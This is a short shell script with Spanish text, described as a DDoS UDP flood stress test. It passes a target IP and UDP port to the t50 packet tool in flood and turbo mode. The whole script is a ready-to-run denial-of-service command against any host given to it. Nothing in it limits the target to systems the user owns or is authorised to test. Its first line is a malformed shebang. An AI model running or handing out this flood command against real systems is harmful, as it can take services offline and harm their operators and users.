!/bin/sh
echo
echo "Script test de stress DDoS UDP Flood"
echo "Uso.: ./t50.sh IP_OBJETIVO PUERTO_UDP"
t50 $1 --dport $2 --flood --turbo -protocol UDP

